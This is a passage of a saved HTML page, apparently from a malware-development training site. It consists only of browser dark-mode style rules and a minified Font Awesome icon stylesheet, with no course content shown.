<!DOCTYPE html>
<html class="dark" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><script type="text/javascript" src="81_files/inject.js"></script><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
html {
    background-color: var(--darkreader-background-ffffff, #181a1b) !important;
}
html {
    color-scheme: dark !important;
}
iframe {
    color-scheme: dark !important;
}
html, body {
    background-color: var(--darkreader-background-ffffff, #181a1b);
}
html, body {
    border-color: var(--darkreader-border-4c4c4c, #736b5e);
    color: var(--darkreader-text-000000, #e8e6e3);
}
a {
    color: var(--darkreader-text-0040ff, #3391ff);
}
table {
    border-color: var(--darkreader-border-808080, #545b5e);
}
mark {
    color: var(--darkreader-text-000000, #e8e6e3);
}
::placeholder {
    color: var(--darkreader-text-a9a9a9, #b2aba1);
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: var(--darkreader-background-faffbd, #404400) !important;
    color: var(--darkreader-text-000000, #e8e6e3) !important;
}
* {
    scrollbar-color: var(--darkreader-background-b0b0b0, #454a4d) var(--darkreader-background-f1f1f1, #202324);
}
::selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
::-moz-selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
}</style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, img.Wirisformula, a[data-testid="headerMediumLogo"]>svg, .d2l-navigation-link-image-container, .d2l-iframe-loading-container {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}
[data-darkreader-inline-stopcolor] {
  stop-color: var(--darkreader-inline-stopcolor) !important;
}
[data-darkreader-inline-bg] {
  background: var(--darkreader-inline-bg) !important;
}
[data-darkreader-inline-border-short] {
  border: var(--darkreader-inline-border-short) !important;
}
[data-darkreader-inline-border-bottom-short] {
  border-bottom: var(--darkreader-inline-border-bottom-short) !important;
}
[data-darkreader-inline-border-left-short] {
  border-left: var(--darkreader-inline-border-left-short) !important;
}
[data-darkreader-inline-border-right-short] {
  border-right: var(--darkreader-inline-border-right-short) !important;
}
[data-darkreader-inline-border-top-short] {
  border-top: var(--darkreader-inline-border-top-short) !important;
}
[data-darkreader-inline-invert] {
    filter: invert(100%) hue-rotate(180deg);
}</style><style class="darkreader darkreader--variables" media="screen">:root {
   --darkreader-neutral-background: var(--darkreader-background-ffffff, #181a1b);
   --darkreader-neutral-text: var(--darkreader-text-000000, #e8e6e3);
   --darkreader-selection-background: var(--darkreader-background-0060d4, #004daa);
   --darkreader-selection-text: var(--darkreader-text-ffffff, #e8e6e3);
}</style><style class="darkreader darkreader--root-vars" media="screen"></style>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link rel="stylesheet" href="81_files/template.css"><style class="darkreader darkreader--sync" media="screen"></style>
        <link rel="shortcut icon" href="https://maldevacademy.com/maldev-icon.png">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="81_files/font-awesome.min.css"><style class="darkreader darkreader--cors" media="screen">.fa{display:inline-block;font:normal normal normal 14px/1 FontAwesome;font-size:inherit;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.fa-lg{font-size:1.33333333em;line-height:.75em;vertical-align:-15%}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-fw{width:1.28571429em;text-align:center}.fa-ul{padding-left:0;margin-left:2.14285714em;list-style-type:none}.fa-ul>li{position:relative}.fa-li{position:absolute;left:-2.14285714em;width:2.14285714em;top:.14285714em;text-align:center}.fa-li.fa-lg{left:-1.85714286em}.fa-border{padding:.2em .25em .15em;border:solid .08em #eee;border-radius:.1em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left{margin-right:.3em}.fa.fa-pull-right{margin-left:.3em}.pull-right{float:right}.pull-left{float:left}.fa.pull-left{margin-right:.3em}.fa.pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}.fa-rotate-90{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";-webkit-transform:scale(-1, 1);-ms-transform:scale(-1, 1);transform:scale(-1, 1)}.fa-flip-vertical{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";-webkit-transform:scale(1, -1);-ms-transform:scale(1, -1);transform:scale(1, -1)}:root .fa-rotate-90,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-flip-horizontal,:root .fa-flip-vertical{filter:none}.fa-stack{position:relative;display:inline-block;width:2em;height:2em;line-height:2em;vertical-align:middle}.fa-stack-1x,.fa-stack-2x{position:absolute;left:0;width:100%;text-align:center}.fa-stack-1x{line-height:inherit}.fa-stack-2x{font-size:2em}.fa-inverse{color:#fff}.fa-glass:before{content:"\f000"}.fa-music:before{content:"\f001"}.fa-search:before{content:"\f002"}.fa-envelope-o:before{content:"\f003"}.fa-heart:before{content:"\f004"}.fa-star:before{content:"\f005"}.fa-star-o:before{content:"\f006"}.fa-user:before{content:"\f007"}.fa-film:before{content:"\f008"}.fa-th-large:before{content:"\f009"}.fa-th:before{content:"\f00a"}.fa-th-list:before{content:"\f00b"}.fa-check:before{content:"\f00c"}.fa-remove:before,.fa-close:before,.fa-times:before{content:"\f00d"}.fa-search-plus:before{content:"\f00e"}.fa-search-minus:before{content:"\f010"}.fa-power-off:before{content:"\f011"}.fa-signal:before{content:"\f012"}.fa-gear:before,.fa-cog:before{content:"\f013"}.fa-trash-o:before{content:"\f014"}.fa-home:before{content:"\f015"}.fa-file-o:before{content:"\f016"}.fa-clock-o:before{content:"\f017"}.fa-road:before{content:"\f018"}.fa-download:before{content:"\f019"}.fa-arrow-circle-o-down:before{content:"\f01a"}.fa-arrow-circle-o-up:before{content:"\f01b"}.fa-inbox:before{content:"\f01c"}.fa-play-circle-o:before{content:"\f01d"}.fa-rotate-right:before,.fa-repeat:before{content:"\f01e"}.fa-refresh:before{content:"\f021"}.fa-list-alt:before{content:"\f022"}.fa-lock:before{content:"\f023"}.fa-flag:before{content:"\f024"}.fa-headphones:before{content:"\f025"}.fa-volume-off:before{content:"\f026"}.fa-volume-down:before{content:"\f027"}.fa-volume-up:before{content:"\f028"}.fa-qrcode:before{content:"\f029"}.fa-barcode:before{content:"\f02a"}.fa-tag:before{content:"\f02b"}.fa-tags:before{content:"\f02c"}.fa-book:before{content:"\f02d"}.fa-bookmark:before{content:"\f02e"}.fa-print:before{content:"\f02f"}.fa-camera:before{content:"\f030"}.fa-font:before{content:"\f031"}.fa-bold:before{content:"\f032"}.fa-italic:before{content:"\f033"}.fa-text-height:before{content:"\f034"}.fa-text-width:before{content:"\f035"}.fa-align-left:before{content:"\f036"}.fa-align-center:before{content:"\f037"}.fa-align-right:before{content:"\f038"}.fa-align-justify:before{content:"\f039"}.fa-list:before{content:"\f03a"}.fa-dedent:before,.fa-outdent:before{content:"\f03b"}.fa-indent:before{content:"\f03c"}.fa-video-camera:before{content:"\f03d"}.fa-photo:before,.fa-image:before,.fa-picture-o:before{content:"\f03e"}.fa-pencil:before{content:"\f040"}.fa-map-marker:before{content:"\f041"}.fa-adjust:before{content:"\f042"}.fa-tint:before{content:"\f043"}.fa-edit:before,.fa-pencil-square-o:before{content:"\f044"}.fa-share-square-o:before{content:"\f045"}.fa-check-square-o:before{content:"\f046"}.fa-arrows:before{content:"\f047"}.fa-step-backward:before{content:"\f048"}.fa-fast-backward:before{content:"\f049"}.fa-backward:before{content:"\f04a"}.fa-play:before{content:"\f04b"}.fa-pause:before{content:"\f04c"}.fa-stop:before{content:"\f04d"}.fa-forward:before{content:"\f04e"}.fa-fast-forward:before{content:"\f050"}.fa-step-forward:before{content:"\f051"}.fa-eject:before{content:"\f052"}.fa-chevron-left:before{content:"\f053"}.fa-chevron-right:before{content:"\f054"}.fa-plus-circle:before{content:"\f055"}.fa-minus-circle:before{content:"\f056"}.fa-times-circle:before{content:"\f057"}.fa-check-circle:before{content:"\f058"}.fa-question-circle:before{content:"\f059"}.fa-info-circle:before{content:"\f05a"}.fa-crosshairs:before{content:"\f05b"}.fa-times-circle-o:before{content:"\f05c"}.fa-check-circle-o:before{content:"\f05d"}.fa-ban:before{content:"\f05e"}.fa-arrow-left:before{content:"\f060"}.fa-arrow-right:before{content:"\f061"}.fa-arrow-up:before{content:"\f062"}.fa-arrow-down:before{content:"\f063"}.fa-mail-forward:before,.fa-share:before{content:"\f064"}.fa-expand:before{content:"\f065"}.fa-compress:before{content:"\f066"}.fa-plus:before{content:"\f067"}.fa-minus:before{content:"\f068"}.fa-asterisk:before{content:"\f069"}.fa-exclamation-circle:before{content:"\f06a"}.fa-gift:before{content:"\f06b"}.fa-leaf:before{content:"\f06c"}.fa-fire:before{content:"\f06d"}.fa-eye:before{content:"\f06e"}.fa-eye-slash:before{content:"\f070"}.fa-warning:before,.fa-exclamation-triangle:before{content:"\f071"}.fa-plane:before{content:"\f072"}.fa-calendar:before{content:"\f073"}.fa-random:before{content:"\f074"}.fa-comment:before{content:"\f075"}.fa-magnet:before{content:"\f076"}.fa-chevron-up:before{content:"\f077"}.fa-chevron-down:before{content:"\f078"}.fa-retweet:before{content:"\f079"}.fa-shopping-cart:before{content:"\f07a"}.fa-folder:before{content:"\f07b"}.fa-folder-open:before{content:"\f07c"}.fa-arrows-v:before{content:"\f07d"}.fa-arrows-h:before{content:"\f07e"}.fa-bar-chart-o:before,.fa-bar-chart:before{content:"\f080"}.fa-twitter-square:before{content:"\f081"}.fa-facebook-square:before{content:"\f082"}.fa-camera-retro:before{content:"\f083"}.fa-key:before{content:"\f084"}.fa-gears:before,.fa-cogs:before{content:"\f085"}.fa-comments:before{content:"\f086"}.fa-thumbs-o-up:before{content:"\f087"}.fa-thumbs-o-down:before{content:"\f088"}.fa-star-half:before{content:"\f089"}.fa-heart-o:before{content:"\f08a"}.fa-sign-out:before{content:"\f08b"}.fa-linkedin-square:before{content:"\f08c"}.fa-thumb-tack:before{content:"\f08d"}.fa-external-link:before{content:"\f08e"}.fa-sign-in:before{content:"\f090"}.fa-trophy:before{content:"\f091"}.fa-github-square:before{content:"\f092"}.fa-upload:before{content:"\f093"}.fa-lemon-o:before{content:"\f094"}.fa-phone:before{content:"\f095"}.fa-square-o:before{content:"\f096"}.fa-bookmark-o:before{content:"\f097"}.fa-phone-square:before{content:"\f098"}.fa-twitter:before{content:"\f099"}.fa-facebook-f:before,.fa-facebook:before{content:"\f09a"}.fa-github:before{content:"\f09b"}.fa-unlock:before{content:"\f09c"}.fa-credit-card:before{content:"\f09d"}.fa-feed:before,.fa-rss:before{content:"\f09e"}.fa-hdd-o:before{content:"\f0a0"}.fa-bullhorn:before{content:"\f0a1"}.fa-bell:before{content:"\f0f3"}.fa-certificate:before{content:"\f0a3"}.fa-hand-o-right:before{content:"\f0a4"}.fa-hand-o-left:before{content:"\f0a5"}.fa-hand-o-up:before{content:"\f0a6"}.fa-hand-o-down:before{content:"\f0a7"}.fa-arrow-circle-left:before{content:"\f0a8"}.fa-arrow-circle-right:before{content:"\f0a9"}.fa-arrow-circle-up:before{content:"\f0aa"}.fa-arrow-circle-down:before{content:"\f0ab"}.fa-globe:before{content:"\f0ac"}.fa-wrench:before{content:"\f0ad"}.fa-tasks:before{content:"\f0ae"}.fa-filter:before{content:"\f0b0"}.fa-briefcase:before{content:"\f0b1"}.fa-arrows-alt:before{content:"\f0b2"}.fa-group:before,.fa-users:before{content:"\f0c0"}.fa-chain:before,.fa-link:before{content:"\f0c1"}.fa-cloud:before{content:"\f0c2"}.fa-flask:before{content:"\f0c3"}.fa-cut:before,.fa-scissors:before{content:"\f0c4"}.fa-copy:before,.fa-files-o:before{content:"\f0c5"}.fa-paperclip:before{content:"\f0c6"}.fa-save:before,.fa-floppy-o:before{content:"\f0c7"}.fa-square:before{content:"\f0c8"}.fa-navicon:before,.fa-reorder:before,.fa-bars:before{content:"\f0c9"}.fa-list-ul:before{content:"\f0ca"}.fa-list-ol:before{content:"\f0cb"}.fa-strikethrough:before{content:"\f0cc"}.fa-underline:before{content:"\f0cd"}.fa-table:before{content:"\f0ce"}.fa-magic:before{content:"\f0d0"}.fa-truck:before{content:"\f0d1"}.fa-pinterest:before{content:"\f0d2"}.fa-pinterest-square:before{content:"\f0d3"}.fa-google-plus-square:before{content:"\f0d4"}.fa-google-plus:before{content:"\f0d5"}.fa-money:before{content:"\f0d6"}.fa-caret-down:before{content:"\f0d7"}.fa-caret-up:before{content:"\f0d8"}.fa-caret-left:before{content:"\f0d9"}.fa-caret-right:before{content:"\f0da"}.fa-columns:before{content:"\f0db"}.fa-unsorted:before,.fa-sort:before{content:"\f0dc"}.fa-sort-down:before,.fa-sort-desc:before{content:"\f0dd"}.fa-sort-up:before,.fa-sort-asc:before{content:"\f0de"}.fa-envelope:before{content:"\f0e0"}.fa-linkedin:before{content:"\f0e1"}.fa-rotate-left:before,.fa-undo:before{content:"\f0e2"}.fa-legal:before,.fa-gavel:before{content:"\f0e3"}.fa-dashboard:before,.fa-tachometer:before{content:"\f0e4"}.fa-comment-o:before{content:"\f0e5"}.fa-comments-o:before{content:"\f0e6"}.fa-flash:before,.fa-bolt:before{content:"\f0e7"}.fa-sitemap:before{content:"\f0e8"}.fa-umbrella:before{content:"\f0e9"}.fa-paste:before,.fa-clipboard:before{content:"\f0ea"}.fa-lightbulb-o:before{content:"\f0eb"}.fa-exchange:before{content:"\f0ec"}.fa-cloud-download:before{content:"\f0ed"}.fa-cloud-upload:before{content:"\f0ee"}.fa-user-md:before{content:"\f0f0"}.fa-stethoscope:before{content:"\f0f1"}.fa-suitcase:before{content:"\f0f2"}.fa-bell-o:before{content:"\f0a2"}.fa-coffee:before{content:"\f0f4"}.fa-cutlery:before{content:"\f0f5"}.fa-file-text-o:before{content:"\f0f6"}.fa-building-o:before{content:"\f0f7"}.fa-hospital-o:before{content:"\f0f8"}.fa-ambulance:before{content:"\f0f9"}.fa-medkit:before{content:"\f0fa"}.fa-fighter-jet:before{content:"\f0fb"}.fa-beer:before{content:"\f0fc"}.fa-h-square:before{content:"\f0fd"}.fa-plus-square:before{content:"\f0fe"}.fa-angle-double-left:before{content:"\f100"}.fa-angle-double-right:before{content:"\f101"}.fa-angle-double-up:before{content:"\f102"}.fa-angle-double-down:before{content:"\f103"}.fa-angle-left:before{content:"\f104"}.fa-angle-right:before{content:"\f105"}.fa-angle-up:before{content:"\f106"}.fa-angle-down:before{content:"\f107"}.fa-desktop:before{content:"\f108"}.fa-laptop:before{content:"\f109"}.fa-tablet:before{content:"\f10a"}.fa-mobile-phone:before,.fa-mobile:before{content:"\f10b"}.fa-circle-o:before{content:"\f10c"}.fa-quote-left:before{content:"\f10d"}.fa-quote-right:before{content:"\f10e"}.fa-spinner:before{content:"\f110"}.fa-circle:before{content:"\f111"}.fa-mail-reply:before,.fa-reply:before{content:"\f112"}.fa-github-alt:before{content:"\f113"}.fa-folder-o:before{content:"\f114"}.fa-folder-open-o:before{content:"\f115"}.fa-smile-o:before{content:"\f118"}.fa-frown-o:before{content:"\f119"}.fa-meh-o:before{content:"\f11a"}.fa-gamepad:before{content:"\f11b"}.fa-keyboard-o:before{content:"\f11c"}.fa-flag-o:before{content:"\f11d"}.fa-flag-checkered:before{content:"\f11e"}.fa-terminal:before{content:"\f120"}.fa-code:before{content:"\f121"}.fa-mail-reply-all:before,.fa-reply-all:before{content:"\f122"}.fa-star-half-empty:before,.fa-star-half-full:before,.fa-star-half-o:before{content:"\f123"}.fa-location-arrow:before{content:"\f124"}.fa-crop:before{content:"\f125"}.fa-code-fork:before{content:"\f126"}.fa-unlink:before,.fa-chain-broken:before{content:"\f127"}.fa-question:before{content:"\f128"}.fa-info:before{content:"\f129"}.fa-exclamation:before{content:"\f12a"}.fa-superscript:before{content:"\f12b"}.fa-subscript:before{content:"\f12c"}.fa-eraser:before{content:"\f12d"}.fa-puzzle-piece:before{content:"\f12e"}.fa-microphone:before{content:"\f130"}.fa-microphone-slash:before{content:"\f131"}.fa-shield:before{content:"\f132"}.fa-calendar-o:before{content:"\f133"}.fa-fire-extinguisher:before{content:"\f134"}.fa-rocket:before{content:"\f135"}.fa-maxcdn:before{content:"\f136"}.fa-chevron-circle-left:before{content:"\f137"}.fa-chevron-circle-right:before{content:"\f138"}.fa-chevron-circle-up:before{content:"\f139"}.fa-chevron-circle-down:before{content:"\f13a"}.fa-html5:before{content:"\f13b"}.fa-css3:before{content:"\f13c"}.fa-anchor:before{content:"\f13d"}.fa-unlock-alt:before{content:"\f13e"}.fa-bullseye:before{content:"\f140"}.fa-ellipsis-h:before{content:"\f141"}.fa-ellipsis-v:before{content:"\f142"}.fa-rss-square:before{content:"\f143"}.fa-play-circle:before{content:"\f144"}.fa-ticket:before{content:"\f145"}.fa-minus-square:before{content:"\f146"}.fa-minus-square-o:before{content:"\f147"}.fa-level-up:before{content:"\f148"}.fa-level-down:before{content:"\f149"}.fa-check-square:before{content:"\f14a"}.fa-pencil-square:before{content:"\f14b"}.fa-external-link-square:before{content:"\f14c"}.fa-share-square:before{content:"\f14d"}.fa-compass:before{content:"\f14e"}.fa-toggle-down:before,.fa-caret-square-o-down:before{content:"\f150"}.fa-toggle-up:before,.fa-caret-square-o-up:before{content:"\f151"}.fa-toggle-right:before,.fa-caret-square-o-right:before{content:"\f152"}.fa-euro:before,.fa-eur:before{content:"\f153"}.fa-gbp:before{content:"\f154"}.fa-dollar:before,.fa-usd:before{content:"\f155"}.fa-rupee:before,.fa-inr:before{content:"\f156"}.fa-cny:before,.fa-rmb:before,.fa-yen:before,.fa-jpy:before{content:"\f157"}.fa-ruble:before,.fa-rouble:before,.fa-rub:before{content:"\f158"}.fa-won:before,.fa-krw:before{content:"\f159"}.fa-bitcoin:before,.fa-btc:before{content:"\f15a"}.fa-file:before{content:"\f15b"}.fa-file-text:before{content:"\f15c"}.fa-sort-alpha-asc:before{content:"\f15d"}.fa-sort-alpha-desc:before{content:"\f15e"}.fa-sort-amount-asc:before{content:"\f160"}.fa-sort-amount-desc:before{content:"\f161"}.fa-sort-numeric-asc:before{content:"\f162"}.fa-sort-numeric-desc:before{content:"\f163"}.fa-thumbs-up:before{content:"\f164"}.fa-thumbs-down:before{content:"\f165"}.fa-youtube-square:before{content:"\f166"}.fa-youtube:before{content:"\f167"}.fa-xing:before{content:"\f168"}.fa-xing-square:before{content:"\f169"}.fa-youtube-play:before{content:"\f16a"}.fa-dropbox:before{content:"\f16b"}.fa-stack-overflow:before{content:"\f16c"}.fa-instagram:before{content:"\f16d"}.fa-flickr:before{content:"\f16e"}.fa-adn:before{content:"\f170"}.fa-bitbucket:before{content:"\f171"}.fa-bitbucket-square:before{content:"\f172"}.fa-tumblr:before{content:"\f173"}.fa-tumblr-square:before{content:"\f174"}.fa-long-arrow-down:before{content:"\f175"}.fa-long-arrow-up:before{content:"\f176"}.fa-long-arrow-left:before{content:"\f177"}.fa-long-arrow-right:before{content:"\f178"}.fa-apple:before{content:"\f179"}.fa-windows:before{content:"\f17a"}.fa-android:before{content:"\f17b"}.fa-linux:before{content:"\f17c"}.fa-dribbble:before{content:"\f17d"}.fa-skype:before{content:"\f17e"}.fa-foursquare:before{content:"\f180"}.fa-trello:before{content:"\f181"}.fa-female:before{content:"\f182"}.fa-male:before{content:"\f183"}.fa-gittip:before,.fa-gratipay:before{content:"\f184"}.fa-sun-o:before{content:"\f185"}.fa-moon-o:before{content:"\f186"}.fa-archive:before{content:"\f187"}.fa-bug:before{content:"\f188"}.fa-vk:before{content:"\f189"}.fa-weibo:before{content:"\f18a"}.fa-renren:before{content:"\f18b"}.fa-pagelines:before{content:"\f18c"}.fa-stack-exchange:before{content:"\f18d"}.fa-arrow-circle-o-right:before{content:"\f18e"}.fa-arrow-circle-o-left:before{content:"\f190"}.fa-toggle-left:before,.fa-caret-square-o-left:before{content:"\f191"}.fa-dot-circle-o:before{content:"\f192"}.fa-wheelchair:before{content:"\f193"}.fa-vimeo-square:before{content:"\f194"}.fa-turkish-lira:before,.fa-try:before{content:"\f195"}.fa-plus-square-o:before{content:"\f196"}.fa-space-shuttle:before{content:"\f197"}.fa-slack:before{content:"\f198"}.fa-envelope-square:before{content:"\f199"}.fa-wordpress:before{content:"\f19a"}.fa-openid:before{content:"\f19b"}.fa-institution:before,.fa-bank:before,.fa-university:before{content:"\f19c"}.fa-mortar-board:before,.fa-graduation-cap:before{content:"\f19d"}.fa-yahoo:before{content:"\f19e"}.fa-google:before{content:"\f1a0"}.fa-reddit:before{content:"\f1a1"}.fa-reddit-square:before{content:"\f1a2"}.fa-stumbleupon-circle:before{content:"\f1a3"}.fa-stumbleupon:before{content:"\f1a4"}.fa-delicious:before{content:"\f1a5"}.fa-digg:before{content:"\f1a6"}.fa-pied-piper-pp:before{content:"\f1a7"}.fa-pied-piper-alt:before{content:"\f1a8"}.fa-drupal:before{content:"\f1a9"}.fa-joomla:before{content:"\f1aa"}.fa-language:before{content:"\f1ab"}.fa-fax:before{content:"\f1ac"}.fa-building:before{content:"\f1ad"}.fa-child:before{content:"\f1ae"}.fa-paw:before{content:"\f1b0"}.fa-spoon:before{content:"\f1b1"}.fa-cube:before{content:"\f1b2"}.fa-cubes:before{content:"\f1b3"}.fa-behance:before{content:"\f1b4"}.fa-behance-square:before{content:"\f1b5"}.fa-steam:before{content:"\f1b6"}.fa-steam-square:before{content:"\f1b7"}.fa-recycle:before{content:"\f1b8"}.fa-automobile:before,.fa-car:before{content:"\f1b9"}.fa-cab:before,.fa-taxi:before{content:"\f1ba"}.fa-tree:before{content:"\f1bb"}.fa-spotify:before{content:"\f1bc"}.fa-deviantart:before{content:"\f1bd"}.fa-soundcloud:before{content:"\f1be"}.fa-database:before{content:"\f1c0"}.fa-file-pdf-o:before{content:"\f1c1"}.fa-file-word-o:before{content:"\f1c2"}.fa-file-excel-o:before{content:"\f1c3"}.fa-file-powerpoint-o:before{content:"\f1c4"}.fa-file-photo-o:before,.fa-file-picture-o:before,.fa-file-image-o:before{content:"\f1c5"}.fa-file-zip-o:before,.fa-file-archive-o:before{content:"\f1c6"}.fa-file-sound-o:before,.fa-file-audio-o:before{content:"\f1c7"}.fa-file-movie-o:before,.fa-file-video-o:before{content:"\f1c8"}.fa-file-code-o:before{content:"\f1c9"}.fa-vine:before{content:"\f1ca"}.fa-codepen:before{content:"\f1cb"}.fa-jsfiddle:before{content:"\f1cc"}.fa-life-bouy:before,.fa-life-buoy:before,.fa-life-saver:before,.fa-support:before,.fa-life-ring:before{content:"\f1cd"}.fa-circle-o-notch:before{content:"\f1ce"}.fa-ra:before,.fa-resistance:before,.fa-rebel:before{content:"\f1d0"}.fa-ge:before,.fa-empire:before{content:"\f1d1"}.fa-git-square:before{content:"\f1d2"}.fa-git:before{content:"\f1d3"}.fa-y-combinator-square:before,.fa-yc-square:before,.fa-hacker-news:before{content:"\f1d4"}.fa-tencent-weibo:before{content:"\f1d5"}.fa-qq:before{content:"\f1d6"}.fa-wechat:before,.fa-weixin:before{content:"\f1d7"}.fa-send:before,.fa-paper-plane:before{content:"\f1d8"}.fa-send-o:before,.fa-paper-plane-o:before{content:"\f1d9"}.fa-history:before{content:"\f1da"}.fa-circle-thin:before{content:"\f1db"}.fa-header:before{content:"\f1dc"}.fa-paragraph:before{content:"\f1dd"}.fa-sliders:before{content:"\f1de"}.fa-share-alt:before{content:"\f1e0"}.fa-share-alt-square:before{content:"\f1e1"}.fa-bomb:before{content:"\f1e2"}.fa-soccer-ball-o:before,.fa-futbol-o:before{content:"\f1e3"}.fa-tty:before{content:"\f1e4"}.fa-binoculars:before{content:"\f1e5"}.fa-plug:before{content:"\f1e6"}.fa-slideshare:before{content:"\f1e7"}.fa-twitch:before{content:"\f1e8"}.fa-yelp:before{content:"\f1e9"}.fa-newspaper-o:before{content:"\f1ea"}.fa-wifi:before{content:"\f1eb"}.fa-calculator:before{content:"\f1ec"}.fa-paypal:before{content:"\f1ed"}.fa-google-wallet:before{content:"\f1ee"}.fa-cc-visa:before{content:"\f1f0"}.fa-cc-mastercard:before{content:"\f1f1"}.fa-cc-discover:before{content:"\f1f2"}.fa-cc-amex:before{content:"\f1f3"}.fa-cc-paypal:before{content:"\f1f4"}.fa-cc-stripe:before{content:"\f1f5"}.fa-bell-slash:before{content:"\f1f6"}.fa-bell-slash-o:before{content:"\f1f7"}.fa-trash:before{content:"\f1f8"}.fa-copyright:before{content:"\f1f9"}.fa-at:before{content:"\f1fa"}.fa-eyedropper:before{content:"\f1fb"}.fa-paint-brush:before{content:"\f1fc"}.fa-birthday-cake:before{content:"\f1fd"}.fa-area-chart:before{content:"\f1fe"}.fa-pie-chart:before{content:"\f200"}.fa-line-chart:before{content:"\f201"}.fa-lastfm:before{content:"\f202"}.fa-lastfm-square:before{content:"\f203"}.fa-toggle-off:before{content:"\f204"}.fa-toggle-on:before{content:"\f205"}.fa-bicycle:before{content:"\f206"}.fa-bus:before{content:"\f207"}.fa-ioxhost:before{content:"\f208"}.fa-angellist:before{content:"\f209"}.fa-cc:before{content:"\f20a"}.fa-shekel:before,.fa-sheqel:before,.fa-ils:before{content:"\f20b"}.fa-meanpath:before{content:"\f20c"}.fa-buysellads:before{content:"\f20d"}.fa-connectdevelop:before{content:"\f20e"}.fa-dashcube:before{content:"\f210"}.fa-forumbee:before{content:"\f211"}.fa-leanpub:before{content:"\f212"}.fa-sellsy:before{content:"\f213"}.fa-shirtsinbulk:before{content:"\f214"}.fa-simplybuilt:before{content:"\f215"}.fa-skyatlas:before{content:"\f216"}.fa-cart-plus:before{content:"\f217"}.fa-cart-arrow-down:before{content:"\f218"}.fa-diamond:before{content:"\f219"}.fa-ship:before{content:"\f21a"}.fa-user-secret:before{content:"\f21b"}.fa-motorcycle:before{content:"\f21c"}.fa-street-view:before{content:"\f21d"}.fa-heartbeat:before{content:"\f21e"}.fa-venus:before{content:"\f221"}.fa-mars:before{content:"\f222"}.fa-mercury:before{content:"\f223"}.fa-intersex:before,.fa-transgender:before{content:"\f224"}.fa-transgender-alt:before{content:"\f225"}.fa-venus-double:before{content:"\f226"}.fa-mars-double:before{content:"\f227"}.fa-venus-mars:before{content:"\f228"}.fa-mars-stroke:before{content:"\f229"}.fa-mars-stroke-v:before{content:"\f22a"}.fa-mars-stroke-h:before{content:"\f22b"}.fa-neuter:before{content:"\f22c"}.fa-genderless:before{content:"\f22d"}.fa-facebook-official:before{content:"\f230"}.fa-pinterest-p:before{content:"\f231"}.fa-whatsapp:before{content:"\f232"}.fa-server:before{content:"\f233"}.fa-user-plus:before{content:"\f234"}.fa-user-times:before{content:"\f235"}.fa-hotel:before,.fa-bed:before{content:"\f236"}.fa-viacoin:before{content:"\f237"}.fa-train:before{content:"\f238"}.fa-subway:before{content:"\f239"}.fa-medium:before{content:"\f23a"}.fa-yc:before,.fa-y-combinator:before{content:"\f23b"}.fa-optin-monster:before{content:"\f23c"}.fa-opencart:before{content:"\f23d"}.fa-expeditedssl:before{content:"\f23e"}.fa-battery-4:before,.fa-battery:before,.fa-battery-full:before{content:"\f240"}.fa-battery-3:before,.fa-battery-three-quarters:before{content:"\f241"}.fa-battery-2:before,.fa-battery-half:before{content:"\